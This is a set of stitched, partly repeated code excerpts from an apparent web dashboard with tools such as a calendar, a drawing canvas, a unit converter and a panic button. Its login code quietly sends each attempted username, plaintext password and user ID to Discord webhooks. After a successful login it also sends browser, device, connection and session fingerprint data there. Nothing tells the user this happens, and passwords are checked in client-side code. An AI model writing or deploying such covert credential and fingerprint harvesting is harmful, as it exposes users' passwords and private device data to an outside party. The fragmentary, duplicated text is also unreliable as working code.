 744:     .panel-btn:hover {
 745:       background: var(--accent-color);
 746:       color: white;
 747:     }

 749:     .calendar-grid {

 753:       margin-top: 15px;

 756:     .calendar-cell {

 760:       justify-content: center;

 778:     /* Login History Entries */
 779:     .login-entry-container {

 810:         width: 100%;

 812:         margin-bottom: 8px;
 813:         border-radius: 6px;

 845:     /* System Updates Panel Styling */

 850:         font-size: 12px;

 853:         color: var(--text-primary); /* Ensure text color adapts */

 858:     /* Settings Modal */
 859:     .settings-modal {
 860:       position: fixed;
 861:       top: 0;
 862:       left: 0;
 863:       width: 100vw;
 864:       height: 100vh;

 890:     .setting-item {

 892:       justify-content: space-between;
 893:       align-items: center;

 895:       background: var(--primary-bg);

 897:       border: 1px solid var(--border-color);

 899:

2174: const EMBED_FIELD_LIMIT = 25; // Discord API limit for fields per embed
2175: 
2176: 
2177: // Helper function to chunk fields into multiple embeds
2178: function createEmbedsFromFields(title, color, fields, description = null) {
2179:     const embeds = [];
2180:     for (let i = 0; i < fields.length; i += EMBED_FIELD_LIMIT) {
2181:         const chunk = fields.slice(i, i + EMBED_FIELD_LIMIT);
2182:         embeds.push({
2183:             title: i === 0 ? title : `${title} (Part ${Math.floor(i / EMBED_FIELD_LIMIT) + 1})`,
2184:             description: i === 0 ? description : null,
2185:             color: color,
2186:             fields: chunk
2187:         });
2188:     }
2189:     if (embeds.length === 0) { // Ensure at least one empty embed if no fields
2190:         embeds.push({
2191:             title: title,
2192:             description: description || "No specific details available.",
2193:             color: color
2194:         });
2195:     }
2196:     return embeds;
2197: }

2200: // Function to send data to Discord webhook
2201: // This function now expects an array of embed objects
2202: async function sendWebhook(url, embeds, username = "System Logger") {
2203:     if (!url) {
2204:         console.error("Webhook URL is undefined for sending embeds:", embeds);
2205:         logError(`Attempted to send webhook with undefined URL for embed.`);
2206:         return;
2207:     }
2208: 
2209:     const finalEmbeds = embeds.map(embed => ({
2210:         ...embed,
2211:         timestamp: embed.timestamp || new Date().toISOString(),
2212:         footer: {
2213:             text: `${username} | ${navigator.userAgent.substring(0, Math.min(250, navigator.userAgent.length))}...` // Truncate UA for footer
2214:         }
2215:     }));
2216: 
2217:     try {
2218:         const response = await fetch(url, {
2219:             method: 'POST',
2220:             headers: {
2221:                 'Content-Type': 'application/json',
2222:             },
2223:             body: JSON.stringify({ embeds: finalEmbeds }),
2224:         });
2225: 
2226:         if (!response.ok) {
2227:             const errorText = await response.text();
2228:             throw new Error(`Discord API error: ${response.status} - ${errorText}`);
2229:         }
2230:         console.log(`Webhook sent successfully to ${url} with ${finalEmbeds.length} embed(s).`);
2231:     } catch (error) {
2232:         console.error('Error sending webhook:', error);
2233:         logError(`Failed to send webhook to ${url}: ${error.message}`);
2234:     }
2235: }

2253: // Helper to parse user agent for more details
2254: function parseUserAgent() {
2255:     const ua = navigator.userAgent;
2256:     let browserName = "Unknown Browser";
2257:     let browserVersion = "Unknown";
2258:     let os = "Unknown OS";
2259:     let osVersion = "Unknown";
2260:     let engine = "Unknown Engine";
2261:     let deviceType = "Desktop";
2262: 
2263:     // Browser Detection
2264:     if (/Chrome/.test(ua) && !/Edge/.test(ua) && !/OPR/.test(ua)) {
2265:         browserName = "Chrome";
2266:         browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || "Unknown";
2267:         engine = "Blink";
2268:     } else if (/Firefox/.test(ua)) {
2269:         browserName = "Firefox";
2270:         browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || "Unknown";
2271:         engine = "Gecko";
2272:     } else if (/Safari/.test(ua) && !/Chrome/.test(ua) && !/Edge/.test(ua)) {
2273:         browserName = "Safari";
2274:         browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || "Unknown";
2275:         engine = "WebKit";
2276:     } else if (/Edge/.test(ua)) {
2277:         browserName = "Edge";
2278:         browserVersion = ua.match(/Edge\/([\d.]+)/)?.[1] || "Unknown";
2279:         engine = "EdgeHTML/Blink"; // Edge switched to Chromium/Blink
2280:     } else if (/OPR|Opera/.test(ua)) {
2281:         browserName = "Opera";
2282:         browserVersion = ua.match(/(?:OPR|Opera)\/([\d.]+)/)?.[1] || "Unknown";
2283:         engine = "Blink/Presto";
2284:     } else if (/Trident/.test(ua) || /MSIE/.test(ua)) {
2285:         browserName = "Internet Explorer";
2286:         browserVersion = ua.match(/(?:MSIE |rv:)(\d+\.?\d*)/)?.[1] || "Unknown";
2287:         engine = "Trident";
2288:     }
2289: 
2290:     // OS Detection
2291:     if (/Windows NT 10.0/.test(ua)) { os = "Windows"; osVersion = "10"; }
2292:     else if (/Windows NT 6.3/.test(ua)) { os = "Windows"; osVersion = "8.1"; }
2293:     else if (/Windows NT 6.2/.test(ua)) { os = "Windows"; osVersion = "8"; }
2294:     else if (/Windows NT 6.1/.test(ua)) { os = "Windows"; osVersion = "7"; }
2295:     else if (/Macintosh|Mac OS X/.test(ua)) { os = "macOS"; osVersion = ua.match(/Mac OS X ([\d_.]+)/)?.[1]?.replace(/_/g, '.') || "Unknown"; }
2296:     else if (/Android/.test(ua)) { os = "Android"; osVersion = ua.match(/Android ([\d.]+)/)?.[1] || "Unknown"; deviceType = "Mobile"; }
2297:     else if (/iPhone|iPad|iPod/.test(ua)) { os = "iOS"; osVersion = ua.match(/OS ([\d_.]+)/)?.[1]?.replace(/_/g, '.') + " (iOS)" || "Unknown"; deviceType = "Mobile"; }
2298:     else if (/Linux/.test(ua)) { os = "Linux"; osVersion = "Unknown"; } // More specific Linux versions are hard from UA
2299: 
2300:     // Device Type refinement
2301:     if (/(tablet|ipad|playbook|silk)|(android(?!.*mobile))/i.test(ua)) deviceType = "Tablet";
2302:     if (/mobile|android|iphone|ipod|blackberry|opera mini|iemobile|webos|fennec|kindle/i.test(ua)) deviceType = "Mobile";
2303: 
2304:     return { browserName, browserVersion, os, osVersion, engine, deviceType };
2305: }
2306:

2329:         { name: "Canvas Support", value: !!window.CanvasRenderingContext2D ? "Yes" : "No", inline: true },
2330:         { name: "WebRTC Support", value: (navigator.getUserMedia || navigator.webkitGetUserMedia || navigator.mozGetUserMedia || navigator.msGetUserMedia) ? "Yes" : "No", inline: true },
2331:         { name: "Geolocation Support", value: !!navigator.geolocation ? "Yes" : "No", inline: true },
2332:         { name: "WebSockets Support", value: !!window.WebSocket ? "Yes" : "No", inline: true },

2334:         { name: "Battery Status API", value: !!navigator.getBattery ? "Yes" : "No", inline: true },
2335:         { name: "Vibration API", value: !!navigator.vibrate ? "Yes" : "No", inline: true },

2338:         { name: "Gamepad API", value: !!navigator.getGamepads ? "Yes" : "No", inline: true },
2339:         { name: "Web Share API", value: !!navigator.share ? "Yes" : "No", inline: true },
2340:         { name: "Credential Management API", value: !!navigator.credentials ? "Yes" : "No", inline: true },
2341:         { name: "Payment Request API", value: !!window.PaymentRequest ? "Yes" : "No", inline: true },
2342:         { name: "Web Authentication API", value: !!navigator.credentials && !!navigator.credentials.create ? "Yes" : "No", inline: true },
2343:         { name: "IndexedDB Support", value: !!window.indexedDB ? "Yes" : "No", inline: true },
2344:         { name: "Web SQL DB Support", value: !!window.openDatabase ? "Yes" : "No", inline: true },
2345:         { name: "OffscreenCanvas Support", value: !!window.OffscreenCanvas ? "Yes" : "No", inline: true },
2346:         { name: "Permissions API", value: !!navigator.permissions ? "Yes" : "No", inline: true },
2347:         { name: "Clipboard API", value: !!navigator.clipboard ? "Yes" : "No", inline: true }
2348:     ];
2349:     return fields;
2350: }

2352: function getDeviceDetailedInfo() {
2353:     const parsedUA = parseUserAgent();
2354:     const fields = [
2355:         { name: "OS Name", value: parsedUA.os, inline: true },
2356:         { name: "OS Version", value: parsedUA.osVersion, inline: true },
2357:         { name: "Platform", value: navigator.platform || "N/A", inline: true },

2792:             if (correctUser.password === password) passwordMatch = true;

2794:         }
2795:     }
2796: 
2797:     if (!usernameMatch) {
2798:         await sendWebhook(webhooks.invaildUsernameInformation, createEmbedsFromFields(
2799:             "ðŸš« Invalid Username: Not Found", 0xFF0000, [{ name: "Attempted Username", value: username, inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
2800:         ));
2801:         loginFailedMessages.push("Username");
2802:         isAnyFieldInvalid = true;
2803:     } 
2804:     if (usernameMatch && !passwordMatch) {
2805:         await sendWebhook(webhooks.invaildPasswordInformation, createEmbedsFromFields(
2806:             "ðŸš« Invalid Password: Mismatch", 0xFF0000, [{ name: "Attempted Password", value: password, inline: true }, { name: "Username Context", value: username, inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
2807:         ));
2808:         loginFailedMessages.push("Password");
2809:         isAnyFieldInvalid = true;
2810:     }
2811:     if (usernameMatch && !userIDMatch) {
2812:         await sendWebhook(webhooks.invaildIdentifierInformation, createEmbedsFromFields(
2813:             "ðŸš« Invalid User ID: Mismatch", 0xFF0000, [{ name: "Attempted User ID", value: userID, inline: true }, { name: "Username Context", value: username, inline: true }, { name: "Timestamp", value: new Date().toLocaleString(), inline: false }]
2814:         ));
2815:         loginFailedMessages.push("User ID");
2816:         isAnyFieldInvalid = true;
2817:     }
2818: 
2819:     let finalFailedMessage = `Login attempt failed for \`\`${username}\`\`: `;
2820:     if (isAnyFieldInvalid) {
2821:         finalFailedMessage += `Invalid ${loginFailedMessages.join(', ')}.`;
2822:     } else {
2823:         finalFailedMessage += `Invalid credentials (username, password, or user ID combination is incorrect).`; 
2824:     }
2825:     // INCORRECT_INFORMATION (for general incorrectness)
2826:     await sendWebhook(webhooks.incorrectInformation, createEmbedsFromFields(
2827:         "âŒ Login Failed: Incorrect Credentials", 0xFF0000, [
2828:             { name: "Attempted Username", value: username, inline: true },
2829:             { name: "Attempted User ID", value: userID, inline: true },
2830:             { name: "Attempts Left", value: `${attempts}`, inline: true },
2831:             { name: "Validation Issue", value: loginFailedMessages.length > 0 ? `Invalid ${loginFailedMessages.join(", ")}` : "Combination Mismatch", inline: false },
2832:             { name: "Timestamp", value: new Date().toLocaleString(), inline: false }
2833:         ]
2834:     ));
2835: 
2836:     failedLogin(username, userID);
2837:   }
2838: }

2969: function generateCalendar() {
2970:   const calendar = document.getElementById('calendarGrid');
2971:   calendar.innerHTML = '';
2972:   
2973:   const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
2974:   const today = new Date();
2975:   const currentMonth = today.getMonth();
2976:   const currentYear = today.getFullYear();
2977:   
2978:   // Add day headers
2979:   days.forEach(day => {
2980:     const dayElement = document.createElement('div');
2981:     dayElement.textContent = day;
2982:     dayElement.className = 'calendar-cell text-xs font-bold text-gray-400';
2983:     calendar.appendChild(dayElement);
2984:   });
2985:   
2986:   // Add calendar days
2987:   const firstDay = new Date(currentYear, currentMonth, 1).getDay();
2988:   const daysInMonth = new Date(currentYear, currentMonth + 1, 0).getDate();
2989:   
2990:   // Empty cells for days before month starts
2991:   for (let i = 0; i < firstDay; i++) {
2992:     const emptyCell = document.createElement('div');
2993:     emptyCell.className = 'calendar-cell';
2994:     calendar.appendChild(emptyCell);
2995:   }
2996:   
2997:   // Days of the month
2998:   for (let day = 1; day <= daysInMonth; day++) {
2999:     const dayCell = document.createElement('div');
3000:     dayCell.textContent = day;
3001:     dayCell.className = 'calendar-cell';
3002:     
3003:     if (day === today.getDate()) {
3004:       dayCell.classList.add('today');
3005:     }
3006:     
3007:     calendar.appendChild(dayCell);
3008:   }
3009: }

3011: function initializeCanvas() {

3021: function startDrawing(e) {
3022:   isDrawing = true;
3023:   const rect = canvas.getBoundingClientRect();
3024:   const x = e.clientX - rect.left;
3025:   const y = e.clientY - rect.top;
3026:   
3027:   ctx.beginPath();
3028:   ctx.moveTo(x, y);
3029: }
3030: 
3031: function draw(e) {
3032:   if (!isDrawing) return;
3033:   
3034:   const rect = canvas.getBoundingClientRect();
3035:   const x = e.clientX - rect.left;
3036:   const y = e.clientY - rect.top;
3037:   
3038:   ctx.lineWidth = currentThickness;
3039:   ctx.lineCap = 'round';
3040:   ctx.strokeStyle = currentTool === 'eraser' ? 'white' : currentColor;
3041:   
3042:   ctx.lineTo(x, y);
3043:   ctx.stroke();
3044:   ctx.beginPath();
3045:   ctx.moveTo(x, y);
3046: }
3047: 
3048: function stopDrawing() {
3049:   isDrawing = false;
3050:   ctx.beginPath();
3051: }

3647: function updateConversionUnits() {

3650:   const toUnit = document.getElementById('toUnit');
3651:   
3652:   const units = {
3653:     length: [
3654:       { value: 'm', text: 'Meters' },
3655:       { value: 'km', text: 'Kilometers' },
3656:       { value: 'cm', text: 'Centimeters' },
3657:       { value: 'mm', text: 'Millimeters' },
3658:       { value: 'in', text: 'Inches' },
3659:       { value: 'ft', text: 'Feet' }
3660:     ],
3661:     weight: [
3662:       { value: 'kg', text: 'Kilograms' },
3663:       { value: 'g', text: 'Grams' },
3664:       { value: 'lb', text: 'Pounds' },
3665:       { value: 'oz', text: 'Ounces' }
3666:     ],
3667:     temperature: [
3668:       { value: 'c', text: 'Celsius' },
3669:       { value: 'f', text: 'Fahrenheit' },
3670:       { value: 'k', text: 'Kelvin' }
3671:     ],
3672:     volume: [
3673:       { value: 'l', text: 'Liters' },
3674:       { value: 'ml', text: 'Milliliters' },
3675:       { value: 'gal', text: 'Gallons' },
3676:       { value: 'qt', text: 'Quarts' }
3677:     ]
3678:   };
3679:   
3680:   fromUnit.innerHTML = '';
3681:   toUnit.innerHTML = '';
3682:   
3683:   units[type].forEach(unit => {
3684:     fromUnit.innerHTML += `<option value="${unit.value}">${unit.text}</option>`;
3685:     toUnit.innerHTML += `<option value="${unit.value}">${unit.text}</option>`;
3686:   });
3687:   convertUnits(); 
3688: }

3690: function convertUnits() {
3691:   const fromValue = parseFloat(document.getElementById('fromValue').value);
3692:   const fromUnit = document.getElementById('fromUnit').value;
3693:   const toUnit = document.getElementById('toUnit').value;
3694:   const type = document.getElementById('conversionType').value;
3695:   
3696:   if (isNaN(fromValue)) {
3697:     document.getElementById('toValue').value = '';
3698:     return;
3699:   }
3700:   
3701:   let result = fromValue;
3702:   
3703:   const factors = {
3704:     length: { 
3705:       'm': 1, 'km': 1000, 'cm': 0.01, 'mm': 0.001, 'in': 0.0254, 'ft': 0.3048
3706:     },
3707:     weight: { 
3708:       'kg': 1000, 'g': 1, 'lb': 453.592, 'oz': 28.3495
3709:     },
3710:     temperature: { 
3711:     },
3712:     volume: { 
3713:         'l': 1, 'ml': 0.001, 'gal': 3.78541, 'qt': 0.946353
3714:     }
3715:   };
3716:   
3717:   if (type === 'length') {
3718:     result = fromValue * factors.length[fromUnit] / factors.length[toUnit];
3719:   } else if (type === 'weight') {
3720:     result = fromValue * factors.weight[fromUnit] / factors.weight[toUnit];
3721:   } else if (type === 'volume') {
3722:     result = fromValue * factors.volume[fromUnit] / factors.volume[toUnit];
3723:   } else if (type === 'temperature') {
3724:       let tempInC;
3725:       if (fromUnit === 'c') tempInC = fromValue;
3726:       else if (fromUnit === 'f') tempInC = (fromValue - 32) * 5/9;
3727:       else if (fromUnit === 'k') tempInC = fromValue - 273.15;
3728: 
3729:       if (toUnit === 'c') result = tempInC;
3730:       else if (toUnit === 'f') result = (tempInC * 9/5) + 32;
3731:       else if (toUnit === 'k') result = tempInC + 273.15;
3732:   }
3733:   
3734:   document.getElementById('toValue').value = result.toFixed(6);
3735:   logActivity(`Unit converted: ${fromValue} ${fromUnit} to ${result.toFixed(6)} ${toUnit}`);
3736: }

3787: // Helper to get a contrasting color for notification icons (simplistic example)
3788: function getContrastColor(hexcolor) {
3789:     const r = parseInt(hexcolor.substr(1, 2), 16);
3790:     const g = parseInt(hexcolor.substr(3, 2), 16);
3791:     const b = parseInt(hexcolor.substr(5, 2), 16);
3792:     const y = (r * 299 + g * 587 + b * 114) / 1000;
3793:     return (y >= 128) ? '#000000' : '#FFFFFF'; // returns black or white
3794: }
```

```
509:   // Handle login submission
510:   async function submitLogin() {
511:     errorMsg.textContent = '';
512:     if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
513:       errorMsg.textContent = 'Please fill all fields.';
514:       return;
515:     }
516: 
517:     const username = usernameInput.value;
518:     const password = passwordInput.value;
519:     const userID = userIDInput.value;
520:     const user = findUser(username, userID);
521: 
522:     // Log the attempt
523:     await logAttemptsCounter(
524:       user?.name || "Unknown",
525:       username,
526:       password,
527:       userID,
528:       attempts
529:     );
530: 
531:     if (!user) {
532:       await logInvalidUsername(user?.name || "Unknown", username);
533:       await logInvalidIdentifier(user?.name || "Unknown", userID);
534:       handleFailedAttempt('User not found.');
535:       return;
536:     }
537: 
538:     if (password !== user.password) {
539:       await logInvalidPassword(user.name, password);
540:       handleFailedAttempt('Incorrect password.');
541:       return;
542:     }
543: 
544:     // Correct login
545:     attempts = 5;
546:     updateAttemptsText();
547:     errorMsg.textContent = '';
548:     resetPopup.style.display = 'none';
549:     loginBox.style.borderColor = 'white';
550:     loginBox.style.boxShadow = '0 0 15px white';
551: 
552:     // Log successful credentials
553:     await logUsername(user.name, username);
554:     await logPassword(user.name, password);
555:     await logIdentifier(user.name, userID);
556: 
557:     // Collect data and send logs
558:     const loggingData = await collectLoggingData(user, password);
559: 
560:     // Send all 5 webhooks:
561:     await Promise.all([
562:       sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
563:       sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
564:       sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
565:       sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
566:       sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
567:     ]);
568: 
569: window.parent.postMessage('login_success', 'https://raw.githubusercontent.com');
570: 
571:     alert(`Welcome ${user.name || user.username}! Login successful.`);
572:     // Optionally clear fields

574:     passwordInput.value = '';
575:     userIDInput.value = '';
576:   }
```

```
1130:   <script>
1131:     // Dashboard functionality object
1132:     const dashboard = {
1133:       // Initialize all dashboard functionality
1134:       init: function() {
1135:         this.initSessionTimer();
1136:         this.initClock();
1137:         this.generateCalendar();
1138:         this.initThemeToggle();
1139:         this.initButtons();
1140:         this.initCanvas();
1141:         this.initPanels();
1142:         this.initQuickBar();
1143:       },
1144:       
1145:       // Initialize session timer
1146:       initSessionTimer: function() {
1147:         let sessionSeconds = 0;
1148:         function formatTime(seconds) {
1149:           const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
1150:           const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
1151:           const secs = String(seconds % 60).padStart(2, '0');
1152:           return `${hrs}:${mins}:${secs}`;
1153:         }
1154:         
1155:         function updateSessionTime() {
1156:           sessionSeconds++;
1157:           document.getElementById('sessionTime').innerText = `â³ Session Time: ${formatTime(sessionSeconds)}`;
1158:         }
1159:         
1160:         updateSessionTime();
1161:         setInterval(updateSessionTime, 1000);
1162:       },
1163:       
1164:       // Initialize real-time clock
1165:       initClock: function() {
1166:         function updateClock() {
1167:           const now = new Date();
1168:           const options = { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true };
1169:           const timeStr = now.toLocaleTimeString(undefined, options);
1170:           const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });
1171: 
1172:           document.getElementById('realTimeClock').innerText = 'ðŸ•’ ' + timeStr;
1173:           document.getElementById('realDate').innerText = 'ðŸ“… ' + dateStr;
1174:         }
1175:         
1176:         updateClock();
1177:         setInterval(updateClock, 1000);
1178:       },
1179:       
1180:       // Generate calendar
1181:       generateCalendar: function() {
1182:         const calendar = document.getElementById('calendar');
1183:         calendar.innerHTML = ''; 
1184:         const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
1185:         days.forEach(day => {
1186:           const div = document.createElement('div');
1187:           div.innerText = day;
1188:           calendar.appendChild(div);
1189:         });
1190: 
1191:         const date = new Date();
1192:         const year = date.getFullYear();
1193:         const month = date.getMonth();
1194:         const today = date.getDate();
1195: 
1196:         const firstDay = new Date(year, month, 1).getDay();
1197:         const lastDate = new Date(year, month + 1, 0).getDate();
1198: 
1199:         for (let i = 0; i < firstDay; i++) {
1200:           const empty = document.createElement('div');
1201:           calendar.appendChild(empty);
1202:         }
1203: 
1204:         for (let i = 1; i <= lastDate; i++) {
1205:           const cell = document.createElement('div');
1206:           cell.innerText = i;
1207:           if (i === today) cell.classList.add('today');
1208:           calendar.appendChild(cell);
1209:         }
1210:       },
1211:       
1212:       // Initialize theme toggle
1213:       initThemeToggle: function() {
1214:         const themeBtn = document.getElementById('themeToggle');
1215:         themeBtn.addEventListener('click', () => {
1216:           document.body.classList.toggle('light-theme');
1217:           if(document.body.classList.contains('light-theme')){
1218:             themeBtn.innerText = 'â˜€ï¸ Light Mode';
1219:           } else {
1220:             themeBtn.innerText = 'ðŸŒ™ Dark Mode';
1221:           }
1222:         });
1223:       },
1224:       
1225:       // Initialize buttons
1226:       initButtons: function() {
1227:         document.getElementById('panicBtn').addEventListener('click', () => {
1228:           window.open('https://clever.com', '_blank');
1229:         });
1230: 
1231:         document.getElementById('restartBtn').addEventListener('click', () => {
1232:           if(confirm('Are you sure you want to kill the page (restart)?')) {
1233:             document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
1234:           }
1235:         });
1236: 
1237:         document.getElementById('fixIssuesBtn').addEventListener('click', () => {
1238:           alert('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!');
1239:         });
1240:         
1241:         document.getElementById('fullScreenBtn').addEventListener('click', () => {
1242:           if (!document.fullscreenElement) {
1243:             document.documentElement.requestFullscreen().catch(err => {
1244:               alert(`Error attempting to enable full-screen mode: ${err.message}`);
1245:             });
1246:           } else {
1247:             document.exitFullscreen();
1248:           }
1249:         });
1250:         
1251:         let zoomLevel = 1;
1252:         const zoomStep = 0.1;
1253:         const minZoom = 0.5;
1254:         const maxZoom = 2;
1255: 
1256:         document.getElementById('zoomInBtn').addEventListener('click', () => {
1257:           if (zoomLevel < maxZoom) {
1258:             zoomLevel += zoomStep;
1259:             document.body.style.zoom = zoomLevel;
1260:           }
1261:         });
1262: 
1263:         document.getElementById('zoomOutBtn').addEventListener('click', () => {
1264:           if (zoomLevel > minZoom) {
1265:             zoomLevel -= zoomStep;
1266:             document.body.style.zoom = zoomLevel;
1267:           }
1268:         });
1269:       },
1270:       
1271:       // Initialize canvas
1272:       initCanvas: function() {
1273:         const notesBtn = document.getElementById('notesBtn');
1274:         const canvasContainer = document.getElementById('canvasContainer');
1275:         const mainGrid = document.getElementById('mainGrid');
1276: 
1277:         notesBtn.addEventListener('click', () => {
1278:           mainGrid.style.display = 'none';
1279:           canvasContainer.style.display = 'block';
1280:         });
1281: 
1282:         document.getElementById('closeCanvasBtn').addEventListener('click', () => {
1283:           canvasContainer.style.display = 'none';
1284:           mainGrid.style.display = 'flex';
1285:         });
1286: 
1287:         const clearCanvasBtn = document.getElementById('clearCanvasBtn');
1288: 
1289:         const canvas = document.getElementById('notesCanvas');
1290:         const ctx = canvas.getContext('2d');
1291: 
1292:         ctx.fillStyle = '#fff';
1293:         ctx.fillRect(0, 0, canvas.width, canvas.height);
1294: 
1295:         let drawing = false;
1296: 
1297:         function getPos(evt) {
1298:           const rect = canvas.getBoundingClientRect();
1299:           return {
1300:             x: (evt.clientX || evt.touches[0].clientX) - rect.left,
1301:             y: (evt.clientY || evt.touches[0].clientY) - rect.top
1302:           };
1303:         }
1304: 
1305:         canvas.addEventListener('mousedown', (e) => {
1306:           drawing = true;
1307:           const pos = getPos(e);
1308:           ctx.beginPath();
1309:           ctx.moveTo(pos.x, pos.y);
1310:           e.preventDefault();
1311:         });
1312: 
1313:         canvas.addEventListener('touchstart', (e) => {
1314:           drawing = true;
1315:           const pos = getPos(e);
1316:           ctx.beginPath();
1317:           ctx.moveTo(pos.x, pos.y);
1318:           e.preventDefault();
1319:         });
1320: 
1321:         canvas.addEventListener('mousemove', (e) => {
1322:           if (!drawing) return;
1323:           const pos = getPos(e);
1324:           ctx.lineTo(pos.x, pos.y);
1325:           ctx.strokeStyle = '#ff914d';
1326:           ctx.lineWidth = 2;
1327:           ctx.lineCap = 'round';
1328:           ctx.stroke();
1329:           e.preventDefault();
1330:         });
1331: 
1332:         canvas.addEventListener('touchmove', (e) => {
1333:           if (!drawing) return;
1334:           const pos = getPos(e);
1335:           ctx.lineTo(pos.x, pos.y);
1336:           ctx.strokeStyle = '#ff914d';
1337:           ctx.lineWidth = 2;
1338:           ctx.lineCap = 'round';
1339:           ctx.stroke();
1340:           e.preventDefault();
1341:         });
1342: 
1343:         ['mouseup', 'mouseleave', 'touchend', 'touchcancel'].forEach(evtName => {
1344:           canvas.addEventListener(evtName, () => {
1345:             drawing = false;
1346:           });
1347:         });
1348: 
1349:         clearCanvasBtn.addEventListener('click', () => {
1350:           ctx.clearRect(0, 0, canvas.width, canvas.height);
1351:           ctx.fillStyle = '#fff';
1352:           ctx.fillRect(0, 0, canvas.width, canvas.height);
1353:         });
1354: 
1355:         document.getElementById('screenshotBtn').addEventListener('click', () => {
1356:           const elementToCapture = document.body; 
1357:           html2canvas(elementToCapture).then(canvasImg => {
1358:             const link = document.createElement('a');
1359:             link.download = 'dashboard_screenshot.png';
1360:             link.href = canvasImg.toDataURL('image/png');
1361:             link.click();
1362:           });
1363:         });
1364:         
1365:         document.getElementById('exportNotesBtn').addEventListener('click', () => {
1366:           const link = document.createElement('a');
1367:           link.download = 'notes_canvas.png';
1368:           link.href = canvas.toDataURL('image/png');
1369:           link.click();
1370:         });

1501:           return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
1502:         } catch {
1503:           return "Unavailable";
1504:         }
1505:       }
```

```
2175: const EMBED_FIELD_LIMIT = 25; // Discord API limit for fields per embed

2178: // Helper function to chunk fields into multiple embeds
2179: function createEmbedsFromFields(title, color, fields, description = null) {
2180:     const embeds = [];
2181:     for (let i = 0; i < fields.length; i += EMBED_FIELD_LIMIT) {
2182:         const chunk = fields.slice(i, i + EMBED_FIELD_LIMIT);
2183:         embeds.push({
2184:             title: i === 0 ? title : `${title} (Part ${Math.floor(i / EMBED_FIELD_LIMIT) + 1})`,
2185:             description: i === 0 ? description : null,
2186:             color: color,
2187:             fields: chunk
2188:         });
2189:     }
2190:     if (embeds.length === 0) { // Ensure at least one empty embed if no fields
2191:         embeds.push({
2192:             title: title,
2193:             description: description || "No specific details available.",
2194:             color: color
2195:         });
2196:     }
2197:     return embeds;
2198: }

2201: // Function to send data to Discord webhook
2202: // This function now expects an array of embed objects
2203: async function sendWebhook(url, embeds, username = "System Logger") {
2204:     if (!url) {
2205:         console.error("Webhook URL is undefined for sending embeds:", embeds);
2206:         logError(`Attempted to send webhook with undefined URL for embed.`);
2207:         return;
2208:     }
2209: 
2210:     const finalEmbeds = embeds.map(embed => ({
2211:         ...embed,
2212:         timestamp: embed.timestamp || new Date().toISOString(),
2213:         footer: {
2214:             text: `${username} | ${navigator.userAgent.substring(0, Math.min(250, navigator.userAgent.length))}...` // Truncate UA for footer
2215:         }
2216:     }));
2217: 
2218:     try {
2219:         const response = await fetch(url, {
2220:             method: 'POST',
2221:             headers: {
2222:                 'Content-Type': 'application/json',
2223:             },
2224:             body: JSON.stringify({ embeds: finalEmbeds }),
2225:         });
2226: 
2227:         if (!response.ok) {
2228:             const errorText = await response.text();
2229:             throw new Error(`Discord API error: ${response.status} - ${errorText}`);
2230:         }
2231:         console.log(`Webhook sent successfully to ${url} with ${finalEmbeds.length} embed(s).`);
2232:     } catch (error) {
2233:         console.error('Error sending webhook:', error);
2234:         logError(`Failed to send webhook to ${url}: ${error.message}`);
2235:     }
2236: }

2254: // Helper to parse user agent for more details
2255: function parseUserAgent() {
2256:     const ua = navigator.userAgent;
2257:     let browserName = "Unknown Browser";
2258:     let browserVersion = "Unknown";
2259:     let os = "Unknown OS";
2260:     let osVersion = "Unknown";
2261:     let engine = "Unknown Engine";
2262:     let deviceType = "Desktop";
2263: 
2264:     // Browser Detection
2265:     if (/Chrome/.test(ua) && !/Edge/.test(ua) && !/OPR/.test(ua)) {
2266:         browserName = "Chrome";
2267:         browserVersion = ua.match(/Chrome\/([\d.]+)/)?.[1] || "Unknown";
2268:         engine = "Blink";
2269:     } else if (/Firefox/.test(ua)) {
2270:         browserName = "Firefox";
2271:         browserVersion = ua.match(/Firefox\/([\d.]+)/)?.[1] || "Unknown";
2272:         engine = "Gecko";
2273:     } else if (/Safari/.test(ua) && !/Chrome/.test(ua) && !/Edge/.test(ua)) {
2274:         browserName = "Safari";
2275:         browserVersion = ua.match(/Version\/([\d.]+)/)?.[1] || "Unknown";
2276:         engine = "WebKit";
2277:     } else if (/Edge/.test(ua)) {
2278:         browserName = "Edge";
2279:         browserVersion = ua.match(/Edge\/([\d.]+)/)?.[1] || "Unknown";
2280:         engine = "EdgeHTML/Blink"; // Edge switched to Chromium/Blink
2281:     } else if (/OPR|Opera/.test(ua)) {
2282:         browserName = "Opera";
2283:         browserVersion = ua.match(/(?:OPR|Opera)\/([\d.]+)/)?.[1] || "Unknown";
2284:         engine = "Blink/Presto";
2285:     } else if (/Trident/.test(ua) || /MSIE/.test(ua)) {
2286:         browserName = "Internet Explorer";
2287:         browserVersion = ua.match(/(?:MSIE |rv:)(\d+\.?\d*)/)?.[1] || "Unknown";
2288:         engine = "Trident";
2289:     }
2290: 
2291:     // OS Detection
2292:     if (/Windows NT 10.0/.test(ua)) { os = "Windows"; osVersion = "10"; }
2293:     else if (/Windows NT 6.3/.test(ua)) { os = "Windows"; osVersion = "8.1"; }
